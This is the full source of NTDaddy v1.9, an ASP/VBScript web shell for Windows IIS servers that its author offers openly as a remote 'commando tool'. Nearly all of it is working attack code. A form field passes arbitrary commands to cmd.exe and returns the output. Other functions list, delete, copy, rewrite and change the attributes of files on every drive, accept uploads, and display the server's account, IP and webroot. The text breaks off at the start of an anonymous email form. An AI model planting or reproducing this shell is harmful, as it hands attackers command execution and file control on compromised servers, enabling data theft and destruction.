<!--
_______________________________________
|NTDaddy v1.9 by obzerve of fux0r inc.|
|=====================================|
|Vol.1:_Art.19:_Silent_Tactics_Archive|
|******! PUBLIC ! DISTRIBUTION !******|
|-------------------------------------|
|    Welcome to the world of ez remote|
|administration made possible by your |
|friends at fux0r inc. NTDaddy is the |
|most kickass WinNT CGI ninja commando|
|tool you've seen yet. Refer to the   |
|included read me of the original pub |
|distribution for details. Don't just |
|give it out, make people look for it.|
|And dont be a fuckin cock choking    |
|gutter slut and try to pass it off as|
|your own. Because if you do, you suck|
|ass. Also to avoid hipocrisy, yes a  |
|small snippet was borrowed for a few |
|parts here and there but for the     |
|majority is original code by me,     |
|obzerve of fux0r inc. Anyway if you  |
|find something that looks 'built-on',|
|i just made it better, you know how  |
|it is...              oh well, enjoy!|
|-------------------------------------|
|     -obzerve : mr_o@ihateclowns.com |
=======================================
-->
<%@ Language=VBScript %>
<%Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile
On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
szTempFile = "C:\" & oFileSys.GetTempName( )
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If%>
<% if request.form("flag")=""then %>
<html>
<head>
<title>|[NTDaddy v1.9 - obzerve | fux0r inc.]</title>
<%
'Commands
dim fs,f
dim FilePath,FolderPath,FileTo,Cmd
dim selFolder,FolderTo
dim Tempmsg
dim TempAtt
dim TextOutput,TextWrite,TextFile,lblioMode,lblFormat,TextCreateFormat
Const ForReading = 1, ForWriting = 2, ForAppending = 3
Set fs = CreateObject("Scripting.FileSystemObject")
FilePath=Request.Form("FileName")
FolderPath=Request.Form("FolderPath")
selFolder=Request.Form("FolderName")
FolderTo=Request.form("CopyFolderTo")
FileTo=Request.Form("CopyFileTo")
Cmd=Request.Form("cmdOption")
TextCmd=Request.form("cmdtxtFileOption")
Select case Cmd
case "DeleteFile"       
fs.deletefile FilePath,TRUE
response.write("File: " & FilePath & " has been deleted.")
case "DeleteFolder"     
fs.deletefolder selFolder,TRUE
response.write("Folder: " & selFolder & " has been deleted.")
FolderPath=Request.form("RefreshFolderPath")
case "CopyFile"
fs.CopyFile FilePath,FileTo, TRUE
response.write("File: " & FilePath & " has been copied to " & FileTo & ".")
case "CopyFolder"
fs.CopyFolder selFolder,FolderTo, TRUE
response.write("Folder: " & selFolder & " has been copied to " & FolderTo & ".")
case "SetFileAttributes"
on error resume next
if FilePath <> "" then
Set f = fs.GetFile(FilePath)
select case f.attributes
case 0
FileAttributes = "Normal"
case 1
FileAttributes = "Read Only"
case 2
FileAttributes = "Hidden"
case 3  'Extra
FileAttributes = "Read Only, Hidden"
case 4
FileAttributes = "System"
case 7  'Extra
FileAttributes = "Read Only, Hidden, System"
case 8
FileAttributes = "Volume"
case 16
FileAttributes = "Directory"
case 19
FileAttributes = "Read Only, Hidden, Directoy"
case 23
FileAttributes = "Read Only, Hidden, System, Directory"
case 32
FileAttributes = "Archive"
case 33 'Extra
FileAttributes = "Read Only, Archive"
case 34 'Extra
FileAttributes = "Hidden, Archive"
case 38 'Extra
FileAttributes = "Hidden, Archive, System"
case 39 'Extra
FileAttributes = "Read Only, Hidden, Archive, System"
case 48 
FileAttributes = "Directory, Archive"
case 64
FileAttributes = "Alias"
case 128
FileAttributes = "Compressed"
case else
FileAttributes = f.attributes
end select
end if  
response.write("<form name=frmFileAttributes action=ntdaddy.asp method=post>")
response.write("<input type=hidden name=FileName Value=" & chr(34) & FilePath & chr(34) & ">")
response.write("<input type=hidden name=FolderPath Value=" & chr(34) & FolderPath & chr(34) & ">")
response.write("<center><Table border=5 cellpadding=3 bordercolor=#ffffff>")
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>File Name: " & f.name & "</td>")
response.write("<td rowspan=5><center><u><b>Set New Attributes:</b></u></center>")
response.write("<input type=checkbox name=FileAttribute1 value=0 checked>Normal")
response.write("<br><input type=checkbox name=FileAttribute2 value=1>Read Only")
response.write("<br><input type=checkbox name=FileAttribute3 value=2>Hidden")
response.write("<br><input type=checkbox name=FileAttribute4 value=4>System")
response.write("<br><input type=checkbox name=FileAttribute5 value=8>Volume")
response.write("<br><input type=checkbox name=FileAttribute6 value=16>Directory")
response.write("<br><input type=checkbox name=FileAttribute7 value=32>Archive")
response.write("<br><input type=checkbox name=FileAttribute8 value=64>Alias")
response.write("<br><input type=checkbox name=FileAttribute9 value=128>Compressed")
response.write("<br><center><input type=submit name=cmdOption value=ApplyFileAttributes></center>")
response.write("</td></tr>")
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Type of File: " & f.type & "</td></tr>")
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Location: " & f.path)
response.write("<br>Size: " & FormatNumber(f.size/1024, 2)  & "KB  (" & f.size & " bytes)</td></tr>")
if f.DateCreated = "" then
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Created: ----")
else
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Created: " & f.DateCreated)
end if
if f.DateLastAccessed = "" then
response.write("<br>Modified: ----")
else
response.write("<br>Modified: " & f.DateLastAccessed)
end if
if f.DateLastModified = "" then
response.write("<br>Accessed: ----</td></tr>")
else
response.write("<br>Accessed: " & f.DateLastModified & "</td></tr>")
end if
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Attributes: " & FileAttributes & "</td></tr>")
response.write("</table></center></form>")
case "SetFolderAttributes"
on error resume next
FolderPath=Request.form("RefreshFolderPath")
if selFolder <> "" then
Set f = fs.Getfolder(selFolder)
select case f.attributes
case 0
FolderAttributes = "Normal"
case 1
FolderAttributes = "Read Only"
case 2
FolderAttributes = "Hidden"
case 3  'Extra
FolderAttributes = "Read Only, Hidden"
case 4
FolderAttributes = "System"
case 7  'Extra
FolderAttributes = "Read Only, Hidden, System"
case 8
FolderAttributes = "Volume"
case 16
FolderAttributes = "Directory"
case 17 'Extra
FolderAttributes = "Read Only, Directory"
case 18 'Extra
FolderAttributes = "Hidden, Directory"
case 19
FolderAttributes = "Read Only, Hidden, Directoy"
case 20 'Extra
FolderAttributes = "System, Directory"
case 22 'Extra
FolderAttributes = "Hidden, System. Directory"
case 23
FolderAttributes = "Read Only, Hidden, System, Directory"
case 32
FolderAttributes = "Archive"
case 33 'Extra
FolderAttributes = "Read Only, Archive"
case 34 'Extra
FolderAttributes = "Hidden, Archive"
case 38 'Extra
FolderAttributes = "Hidden, Archive, System"
case 39 'Extra
FolderAttributes = "Read Only, Hidden, Archive, System"
case 48 
FolderAttributes = "Directory, Archive"
case 64
FolderAttributes = "Alias"
case 128
FolderAttributes = "Compressed"
case else
FolderAttributes = f1.attributes
end select
end if  
response.write("<form name=frmFolderAttributes action=ntdaddy.asp method=post>")
response.write("<input type=hidden name=FolderName Value=" & chr(34) & selFolder & chr(34) & ">")
response.write("<input type=hidden name=FolderPath Value=" & chr(34) & FolderPath & chr(34) & ">")
response.write("<center><Table border=5 cellpadding=3 cellspacing=1 bordercolor=#ffffff>")
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Folder Name: " & f.name & "</td>")
response.write("<td rowspan=5><center><u><b>Set New Attributes:</b></u></center>")
response.write("<input type=checkbox name=FolderAttribute1 value=0 checked>Normal")
response.write("<br><input type=checkbox name=FolderAttribute2 value=1>Read Only")
response.write("<br><input type=checkbox name=FolderAttribute3 value=2>Hidden")
response.write("<br><input type=checkbox name=FolderAttribute4 value=4>System")
response.write("<br><input type=checkbox name=FolderAttribute5 value=8>Volume")
response.write("<br><input type=checkbox name=FolderAttribute6 value=16>Directory")
response.write("<br><input type=checkbox name=FolderAttribute7 value=32>Archive")
response.write("<br><input type=checkbox name=FolderAttribute8 value=64>Alias")
response.write("<br><input type=checkbox name=FolderAttribute9 value=128>Compressed")
response.write("<br><center><input type=submit name=cmdOption value=ApplyFolderAttributes></center>")
response.write("</td></tr>")
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Type of Folder: " & f.type & "</td></tr>")
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Location: " & f.path)
response.write("<br>Size: " & FormatNumber(f.size/1024, 2)  & "KB  (" & f.size & " bytes)</td></tr>")
if f.DateCreated = "" then
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Created: ----")
else
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Created: " & f.DateCreated)
end if
if f.DateLastAccessed = "" then
response.write("<br>Modified: ----")
else
response.write("<br>Modified: " & f.DateLastAccessed)
end if
if f.DateLastModified = "" then
response.write("<br>Accessed: ----</td></tr>")
else
response.write("<br>Accessed: " & f.DateLastModified & "</td></tr>")
end if
response.write("<tr><td bgcolor=#F8F8FF><font color=#000000>Attributes: " & FolderAttributes & "</td></tr>")
response.write("</table></center></form>")
case "OpenTextFile"
If FilePath <> "" then
lblioMode=Request.form("optiomode")
lblFormat=request.form("optformat")
set TextFile = fs.OpenTextFile (FilePath, lblioMode, lblFormat)
TextOutput = TextFile.ReadAll   
'TextOutput=""
'Do While TextFile.AtEndOfStream <> True
'       TextOutput = TextOutput & TextFile.ReadLine
'Loop
TextFile.close
else
FilePath = FolderPath
end if
response.write("<form name=frmTextFile action=ntdaddy.asp method=post>")
response.write("<center><table border=5 cellspacing=1 cellpadding=3 bordercolor=#ffffff width=100% height=100% >")
response.write("<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOption value=SaveAs><input type=text size=77 name=FileName value=" & chr(34) & FilePath & chr(34) & "><select name=optUnicode><option value=FALSE>ASCII <option value=TRUE>Unicode</select></td></tr>")
response.write("<tr><td bgcolor=#ffffff><center><textarea name=txtFile rows=20 cols=85>" & TextOutput & "</textarea></center></td></tr>")
response.write(chr(13))
response.write(chr(13))
response.write(chr(13))
response.write(chr(13))
response.write("<ERROR: THIS IS NOT A TEXT FILE>")
response.write(chr(13))
response.write("<FilePath: " & FilePath & ">")
response.write(chr(13))
response.write("<ioMode: " & lblioMode & ">")
response.write(chr(13))
response.write("<Format: " & lblFormat & ">")
response.write(chr(13))
response.write(chr(13))
response.write(chr(13))
response.write(chr(13))
response.write("<tr><td><input type=hidden name=FolderPath Value=" & chr(34) & FolderPath & chr(34) & "></td></tr>")
response.write("</table></center><p>") 
case "ApplyFileAttributes"
TempAtt=int(Request.form("FileAttribute1"))
TempAtt=TempAtt + int(Request.form("FileAttribute2"))
TempAtt=TempAtt + int(Request.form("FileAttribute3"))
TempAtt=TempAtt + int(Request.form("FileAttribute4"))
TempAtt=TempAtt + int(Request.form("FileAttribute5"))
TempAtt=TempAtt + int(Request.form("FileAttribute6"))
TempAtt=TempAtt + int(Request.form("FileAttribute7"))
TempAtt=TempAtt + int(Request.form("FileAttribute8"))
TempAtt=TempAtt + int(Request.form("FileAttribute9"))
Set f = fs.GetFile(FilePath)
f.attributes=int(TempAtt)
response.write("File: " & FilePath & " attributes have been changed.")
case "ApplyFolderAttributes"
FolderPath=Request.form("RefreshFolderPath")
TempAtt=int(Request.form("FolderAttribute1"))
TempAtt=TempAtt + int(Request.form("FolderAttribute2"))
TempAtt=TempAtt + int(Request.form("FolderAttribute3"))
TempAtt=TempAtt + int(Request.form("FolderAttribute4"))
TempAtt=TempAtt + int(Request.form("FolderAttribute5"))
TempAtt=TempAtt + int(Request.form("FolderAttribute6"))
TempAtt=TempAtt + int(Request.form("FolderAttribute7"))
TempAtt=TempAtt + int(Request.form("FolderAttribute8"))
TempAtt=TempAtt + int(Request.form("FolderAttribute9"))
Set f = fs.Getfolder(selFolder)
f.attributes=int(TempAtt)
response.write("Folder: " & selFolder & " attributes have been changed.")
end select
Select Case TextCmd
case "SaveAs"
TextWrite = Request.form("txtFile")
TextCreateFormat = Request.form("optUnicode")
if textcreateformat = "TRUE" then
tempmsg="Unicode"
else
tempmsg="ASCII"
end if
Set TextFile = fs.CreateTextFile(FilePath, True,TextCreateFormat)
TextFile.Write TextWrite
TextFile.Close
response.write("File: " & FilePath & " Format: " & tempmsg & " has been saved.")
end select
%>
<%
Public CurrentPath
Function ShowDriveLetters()
on error resume next
Dim fs, d, dc, t
dim isReadyColor,TempSize,ShowDriveInfo
Set fs = CreateObject("Scripting.FileSystemObject")
Set dc = fs.Drives
ShowDriveInfo=Request.Form("chkShowDriveInfo")
response.write("<form name=lstDrives action=ntdaddy.asp method=post>")
response.write("<table border=5 cellspacing=1 cellpadding=3 bordercolor=#ffffff>")
if showdriveinfo="TRUE" then
response.write("<tr colspan=8><td align=center colspan=8 bgcolor=#F8F8FF><font color=#000000><input type=checkbox name=chkShowDriveInfo value=TRUE> Show Drive Info  </td></tr>")
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>File System</u><b></td>")
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Serial #</u><b></td>")
else
response.write("<tr colspan=2><td align=center colspan=2 bgcolor=#f8f8ff><font color=#000000><input type=checkbox name=chkShowDriveInfo value=TRUE>Show Drive Info</td></tr>")
end if
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Type</u><b></td>")
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Drive</u><b></td>")
if showdriveinfo="TRUE" then
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Volume Name</u><b></td>")
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Share Name</u><b></td>")
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Free Space</u><b></td>")
response.write("<td align=center bgcolor=#f8f8ff><font color=#000000><b><u>Total Size</u><b></td>")
end if
response.write("</tr>")
For Each d in dc
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
if showdriveinfo="TRUE" then
if d.isReady then
response.write("<TR bgcolor=#000000>")
else
response.write("<TR bgcolor=#191970>")
end if
if d.filesystem = "" then
response.write("<td align=center>....</td>")
else
response.write("<td align=center>" & d.filesystem & "</td>")
end if
if d.SerialNumber = "" then
response.write("<td align=center>....</td>")
else
response.write("<td align=center>" & d.SerialNumber & "</td>")
end if
else
response.write("<TR>")
end if
response.write("<td align=center>" & t & "</td>")
response.write("<td align=center><input type=submit name=FolderPath value=" & d.driveletter & ":\></td>")
if showdriveinfo="TRUE" then
if d.volumename="" then
response.write("<td align=center>....</td>")
else
response.write("<td align=center>" & d.volumename & "</td>")
end if
if d.sharename="" then
response.write("<td align=center>....</td>")
else
response.write("<td align=center>" & d.sharename & "</td>")
end if
str=""
str=str & d.driveletter
str=str & ":"
'response.write(str)
if d.isready then
freespace = (d.AvailableSpace / 1048576)
set sp=fs.getdrive(str)
response.write("<td align=center>" & Round(freespace,1) & " MB</td>")
else
response.write("<td align=center>....</td>")
end if
str=""
str=str & d.driveletter
str=str & ":"
'response.write(str)
if d.isready then
totalspace = (d.TotalSize / 1048576)
set sp=fs.getdrive(str)
response.write("<td align=center>" & Round(totalspace,1) & " MB</td>")
else
response.write("<td align=center>....</td>")
end if
end if
Next
response.write("</tr>")
response.write("</tr></table>")
response.write("</form>")
End Function
Function ShowFolderNames()
on error resume next
Dim fs, f, f1, s, sf ,FP
dim ShowFolderInfo,FolderAttributes 
ShowFolderInfo=request.form("chkShowFolderInfo")
FP=Request.Form("FolderPath")
if FP = "RefreshFolder" or request.form("cmdOption")="DeleteFolder" or request.form("cmdOption")="CopyFolder" or request.form("cmdOption")="SetFolderAttributes" then
FP=request.form("RefreshFolderPath")
IP=chr(34) & IP & chr(34)
end if
CurrentPath=FP
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFolder(FP)
Set sf = f.SubFolders
response.write("<form name=lstFolders action=ntdaddy.asp method=post>")
response.write("<table border=5 cellspacing=1 cellpadding=3 bordercolor=#ffffff>")
response.write("<tr colspan=10><td align=left colspan=10 bgcolor=#F8F8FF><font color=#000000><input type=Submit name=FolderPath value=RefreshFolder></td></tr>")
response.write("<input type=hidden name=RefreshFolderPath value=" & chr(34) &  fp & chr(34) & ">")
response.write("<tr colspan=10><td align=left colspan=10 bgcolor=#F8F8FF><font color=#000000><input type=checkbox name=chkShowFolderInfo value=TRUE> Show Folder Info</td></tr>")
response.write("<tr colspan=10><td colspan=10 align=left bgcolor=#F8F8FF><font color=#000000><input type=submit name=cmdOption Value=DeleteFolder><br><input type=submit name=cmdOption Value=CopyFolder> to <input type=text name=CopyFolderTo></td></tr>")
response.write("<tr colspan=10><td colspan=10 align=left bgcolor=#F8F8FF><font color=#000000><input type=submit name=cmdOption Value=SetFolderAttributes>")
if showfolderinfo="TRUE" then
response.write("<TR>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Folder</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Size</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Type</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Attributes</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Created</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Last Accessed</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Last Modified</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Short Name</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Short Path</u></b></td>")
response.write("</tr>")
end if
For Each f1 in sf
if showfolderinfo="TRUE" then
response.write("<tr>")
response.write("<td><input type=radio name=FolderName value=" & chr(34) & FP & f1.name & chr(34) & "><Input type=submit name=FolderPath value=" & chr(34) & FP & F1.name & "\" & chr(34) & "></td>")
response.write("<td align=center nowrap>" & FormatNumber(f1.size/1024, 0)  & " kb</td>")
response.write("<td align=center nowrap>" & f1.type & "</td>")
folderattributes="...."
select case f1.attributes
case 0
FolderAttributes = "Normal"
case 1
FolderAttributes = "Read Only"
case 2
FolderAttributes = "Hidden"
case 3  'Extra
FolderAttributes = "Read Only, Hidden"
case 4
FolderAttributes = "System"
case 7  'Extra
FolderAttributes = "Read Only, Hidden, System"
case 8
FolderAttributes = "Volume"
case 16
FolderAttributes = "Directory"
case 17 'Extra
FolderAttributes = "Read Only, Directory"
case 18 'Extra
FolderAttributes = "Hidden, Directory"
case 19
FolderAttributes = "Read Only, Hidden, Directoy"
case 20 'Extra
FolderAttributes = "System, Directory"
case 22 'Extra
FolderAttributes = "Hidden, System. Directory"
case 23
FolderAttributes = "Read Only, Hidden, System, Directory"
case 32
FolderAttributes = "Archive"
case 33 'Extra
FolderAttributes = "Read Only, Archive"
case 34 'Extra
FolderAttributes = "Hidden, Archive"
case 38 'Extra
FolderAttributes = "Hidden, Archive, System"
case 39 'Extra
FolderAttributes = "Read Only, Hidden, Archive, System"
case 48 
FolderAttributes = "Directory, Archive"
case 64
FolderAttributes = "Alias"
case 128
FolderAttributes = "Compressed"
case else
FolderAttributes = f1.attributes
end select
response.write("<td align=center nowrap>" & FolderAttributes & "</td>")
if f1.datecreated = "" then
response.write("<td align=center nowrap>....</td>")
else
response.write("<td align=center nowrap>" & f1.datecreated & "</td>")
end if
if f1.datelastaccessed = "" then
response.write("<td align=center nowrap>....</td>")
else
response.write("<td align=center nowrap>" & f1.datelastaccessed & "</td>")
end if
if f1.datelastmodified = "" then
response.write("<td align=center nowrap>....</td>")
else
response.write("<td align=center nowrap>" & f1.datelastmodified & "</td>")
end if
response.write("<td align=center nowrap>" & f1.shortname & "</td>")
response.write("<td align=center nowrap>" & f1.shortpath & "\</td></tr>")
else
response.write("<tr><td><input type=radio name=FolderName value=" & chr(34) & FP & f1.name & chr(34) & "><Input type=submit name=FolderPath value=" & chr(34) & FP & F1.name & "\" & chr(34) & "></td></tr>")
end if
Next
response.write("</table>")
response.write("</form>")
End Function
Function ShowFileNames()
on error resume next
Dim fs, f, f1, fc, FP
dim ShowFileInfo,FileAttributes,ShowPrefix
ShowPrefix=request.form("txtShowPrefix")
ShowFileInfo=Request.form("chkShowFileInfo")
FP=Request.Form("FolderPath")
if FP = "RefreshFolder" or request.form("cmdOption")="DeleteFolder" or request.form("cmdOption")="CopyFolder" or request.form("cmdOption")="SetFolderAttributes" then
FP=request.form("RefreshFolderPath")
IP=chr(34) & IP & chr(34)
end if
CurrentPath=FP
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.GetFolder(FP)
Set fc = f.Files
response.write("<form name=lstFiles action=ntdaddy.asp method=post>")
response.write("<table border=5 cellspacing=1 cellpadding=3 bordercolor=#ffffff>")
response.write("<tr colspan=10><td align=left colspan=10 bgcolor=#F8F8FF><font color=#000000><input type=submit value=RefreshFiles> <input type=checkbox name=chkShowFileInfo value=TRUE> Show File Info &<br>Show Only:  <input type=text name=txtShowPrefix value= ></td></tr>")
response.write("<tr colspan=10><td colspan=10 align=left bgcolor=#F8F8FF><font color=#000000><input type=submit name=cmdOption Value=DeleteFile><input type=submit name=cmdOption Value=CopyFile> to <input type=text name=CopyFileTo></td></tr>")
response.write("<tr colspan=10><td colspan=10 align=left bgcolor=#F8F8FF><font color=#000000><input type=submit name=cmdOption Value=OpenTextFile><select name=optioMode><option value=" & chr(34) & "1" & chr(34) & ">For Reading <option value="& chr(34) & "2" & chr(34) & ">For Writing <option value=" & chr(34) & "8" & chr(34) & ">For Appending</select><select name=optformat><option value=" & chr(34) & "-2" & chr(34) & ">System Default <option value=" & chr(34) & "-1" & chr(34) & ">Unicode <option value=" & chr(34) & "0" & chr(34) & ">ASCII</select></td>")
response.write("<tr colspan=10><td colspan=10 align=left bgcolor=#F8F8FF><font color=#000000><input type=submit name=cmdOption Value=SetFileAttributes>")
response.write("<input type=hidden name=FolderPath Value=" & chr(34) & fp & chr(34) & "></tr>")
if showfileinfo="TRUE" then
response.write("<TR>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>File</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Size</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Type</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Attributes</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Created</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Last Accessed</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Last Modified</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Short Name</u></b></td>")
response.write("<td align=center nowrap bgcolor=#ffffff><font color=#000000><b><u>Short Path</u></b></td>")
response.write("</tr>")
end if
For Each f1 in fc
if showfileinfo="TRUE" then
if lcase(right(f1.name,(len(ShowPrefix)))) = lcase(ShowPrefix) then
response.write("<tr>")
response.write("<td align=center nowrap><input type=radio name=FileName value=" & chr(34) & FP & f1.name & chr(34) & ">" & f1.name & "</td>")
response.write("<td align=center nowrap>" & FormatNumber(f1.size/1024, 0)  & " kb</td>")
response.write("<td align=center nowrap>" & f1.type & "</td>")
select case f1.attributes
case 0
FileAttributes = "Normal"
case 1
FileAttributes = "Read Only"
case 2
FileAttributes = "Hidden"
case 3  'Extra
FileAttributes = "Read Only, Hidden"
case 4
FileAttributes = "System"
case 7  'Extra
FileAttributes = "Read Only, Hidden, System"
case 8
FileAttributes = "Volume"
case 16
FileAttributes = "Directory"
case 19
FileAttributes = "Read Only, Hidden, Directoy"
case 23
FileAttributes = "Read Only, Hidden, System, Directory"
case 32
FileAttributes = "Archive"
case 33 'Extra
FileAttributes = "Read Only, Archive"
case 34 'Extra
FileAttributes = "Hidden, Archive"
case 38 'Extra
FileAttributes = "Hidden, Archive, System"
case 39 'Extra
FileAttributes = "Read Only, Hidden, Archive, System"
case 48 
FileAttributes = "Directory, Archive"
case 64
FileAttributes = "Alias"
case 128
FileAttributes = "Compressed"
case else
FileAttributes = f1.attributes
end select
response.write("<td align=center nowrap>" & FileAttributes & "</td>")
if f1.datecreated = "" then
response.write("<td align=center nowrap>....</td>")
else
response.write("<td align=center nowrap>" & f1.datecreated & "</td>")
end if
if f1.datelastaccessed = "" then
response.write("<td align=center nowrap>....</td>")
else
response.write("<td align=center nowrap>" & f1.datelastaccessed & "</td>")
end if
if f1.datelastmodified = "" then
response.write("<td align=center nowrap>....</td>")
else
response.write("<td align=center nowrap>" & f1.datelastmodified & "</td>")
end if
response.write("<td align=center nowrap>" & f1.shortname & "</td>")
response.write("<td align=center nowrap>" & f1.shortpath & "</td></tr>")
end if
else
if lcase(right(f1.name,(len(ShowPrefix)))) = lcase(ShowPrefix) then
response.write("<tr><td><input type=radio name=FileName value=" & chr(34) & FP & f1.name & chr(34) & ">" & f1.name & "</td></tr>")
end if
end if
Next
response.write("</table>")
response.write("</form>")
End Function
%>
<STYLE>
BODY
{scrollbar-face-color: #f8f8ff; scrollbar-shadow-color: #cccccc;
scrollbar-highlight-color: #cccccc; scrollbar-3dlight-color: #cccccc;
scrollbar-darkshadow-color: #000000; scrollbar-track-color: #000000;
scrollbar-arrow-color: #000000}
</STYLE>
</head>
<body bgcolor=#000000 text=#ffffff>
<center>
<font size="18" color="#ffffff">NTDaddy | fux0r inc.</font>
<hr color="#ffffff">
<table border=1 width="100%" color="#fffff">
<tr>
<td align=center width=100% bgcolor=#ffffff><font color=#000000><a name=lblCurrentPath value=
<% 
FP=Request.Form("FolderPath")
if FP = "RefreshFolder" or request.form("cmdOption")="DeleteFolder" or request.form("cmdOption")="CopyFolder" or request.form("cmdOption")="SetFolderAttributes" then
FP=request.form("RefreshFolderPath")
end if
response.write(chr(34) & IP & chr(34) & ">" & FP)
%>
</a></td>
</tr>
</table>
<table border=0 cellspacing=1 bordercolor="#ffffff" width=100% height=100%>
<tr colspan=3><td align=left colspan=3><% =ShowDriveLetters() %></td>
<td align=center></td></tr>
<tr valign=top width=100%><td align=left><% =ShowFolderNames() %></td>
<td align=right><% =ShowFileNames() %></td>
</tr>
</table>
<br><hr color="#ffffff"><br>
<table cellpadding="3" cellspacing="3" border="5" bordercolor="#ffffff">
<tr>
<td align="left" bgcolor="#F8F8FF">
<font color="#000000" size="4"><b>• Remote Info.</b></font>
</td>
<td align="left" bgcolor="#F8F8FF">
<font color="#000000" size="4"><b>• Local Info.</b></font>
</td>
</tr>
<tr>
<td align=left>
<div align=left><font size="3">
<b>User</b>: <%= "\\" & oScriptNet.ComputerName & " \ " & oScriptNet.UserName %> <br>
<b>ID</b>: <%=request.servervariables("SERVER_NAME")%> <br>
<b>IP</b>: <%=request.servervariables("LOCAL_ADDR")%> <br>
<b>HTTPD</b>: <%=request.servervariables("SERVER_SOFTWARE")%> <b>Port</b>: <%=request.servervariables("SERVER_PORT")%> <br>
<b>Webroot</b>: <%=request.servervariables("APPL_PHYSICAL_PATH")%> <br>
<b>LogRoot</b>: <%=request.servervariables("APPL_MD_PATH")%> <br>
<b>Date</b>: <% =date() %> <br>
<b>Time</b>: <%=time() %> <br>
<b>HTTPs</b>: <%=request.servervariables("HTTPS")%>
<br></font></div>
</td>
<td align="left" valign="top">
<b>Local Addr (What they see.)</b>: <%=request.servervariables("REMOTE_ADDR")%> <br>
<b>Forwarded from</b> : <%=request.servervariables("HTTP_X_FORWARDED_FOR")%> <br>
<b>Via</b>: <%=request.servervariables("HTTP_VIA")%> <br>
<b>User Agent</b>: <%=request.servervariables("HTTP_USER_AGENT")%> <br>
<b>Wookie</b>: <%=request.servervariables("HTTP_WOOKIE")%> <br>
<b>Cache Control</b>: <%=request.servervariables("HTTP_CACHE_CONTROL")%> <br>
<b>Interface</b>: <%=request.servervariables("GATEWAY_INTERFACE")%> <br>
<b>Protocol</b>: <%=request.servervariables("SERVER_PROTOCOL")%> <br>
<b>Method</b>: <%=request.servervariables("REQUEST_METHOD")%>
</td>
</tr>
</table>
<br>
<hr color="#ffffff">
<br>
<table cellpadding="3" cellspacing"1" bordercolor="#F8F8FF" border=5>
<tr>
<td align="left" bgcolor="#F8F8FF">
<font size="2" color="#000000"><b>• File Upload Utility</b></font></td>
</tr>
<tr>
<td align="left">
<form method=post ENCTYPE="multipart/form-data">
<b>File</b> : <input type="file" size="35" name="File1"><br>
<input type="submit" Name="Action" value="Upload the file">
</form></td>
</tr>
<tr>
<td align="left" bgcolor="#F8F8FF">
<font size="2" color="#000000"><b>• RAW D.O.S. COMMAND INTERFACE</b></font></td>
</tr>
<tr valign="top">
<td align="left">
<form action="<%= Request.ServerVariables("URL") %>" method="POST">
<p><input type="text" name=".CMD" size="45" value="<%= szCMD %>"> <input type="submit" value="Run"> </p>
</form>
<pre>
<%
If (IsObject(oFile)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
End If%>
</pre>
</td>
</tr>
</table>
<br>
<hr color="#ffffff">
<br>
<form action=ntdaddy.asp method=post>
<form action=ntdaddy.asp method=post>
<table border=3 cellpadding="3" cellspacing="2" bordercolor="#ffffff" width="400">
<tr>
<td bgcolor="#F8F8FF" colspan="2"><font color="#000000" align="left"><b>• Anonymous Email Utility</b></font></td>
<tr>
<td bgcolor="#F8F8FF"><font color="#000000"><b>From:</b></font> </td>
